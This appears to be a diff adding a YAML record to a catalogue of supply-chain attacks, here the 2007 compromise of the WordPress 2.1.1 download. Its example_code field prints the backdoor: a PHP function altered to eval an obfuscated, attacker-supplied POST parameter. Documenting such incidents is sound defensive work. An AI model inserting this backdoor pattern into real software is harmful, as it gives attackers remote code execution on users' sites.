@@ -1,0 +1,39 @@
+- name: WordPress
+  title: WordPress download compromised
+  start_date: 2007-03-01
+  end_date: 2007-03-02
+  license: GPL
+  website: https://wordpress.org/
+  repo: https://github.com/WordPress/WordPress
+  attribution_type: unknown
+  component_type: Application
+  lang: PHP
+  cause: compromise
+  motive: backdoor
+  attack_vector: server compromise
+  insertion_phase: distribution
+  impact_type: backdoor
+  impact_user_count: 3000
+  references:
+    - https://wordpress.org/news/2007/03/upgrade-recovery/
+  versions:
+    - 2.1.1
+  synopsis: WordPress version 2.1.1 distribution was compromised with a backdoor. The compromised distribution contained code allowing remote attackers to execute arbitrary PHP code.
+  compromise_desc: Unknown attackers compromised a server hosting WordPress downloads and modified the distribution to include a backdoor. The WordPress development team discovered the breach and quickly removed the compromised version, replacing it with a secure version 2.1.2.
+  impact_desc: The backdoor allowed attackers to execute arbitrary PHP code on websites running the compromised version. Users who downloaded WordPress version 2.1.1 during the compromise period were advised to immediately upgrade to version 2.1.2.
+  example_code: |
+    function get_currentuserinfo() {
+      global $user_login, $userdata, $user_level, $user_ID, $user_email, $user_url, $user_pass_md5, $user_identity, $current_user;
+
+      // Added by hackers
+      if (isset($_POST['iz']) && isset($_GET['iz'])) {
+        if ($current_user->ID && $current_user->user_login != 'admin') {
+          return;
+        }
+        eval(base64_decode(str_rot13(urldecode(base64_decode(urldecode($_POST['iz']))))));
+        return;
+      }
+      // End of added code
+
+      [... rest of original function ...]
+    }
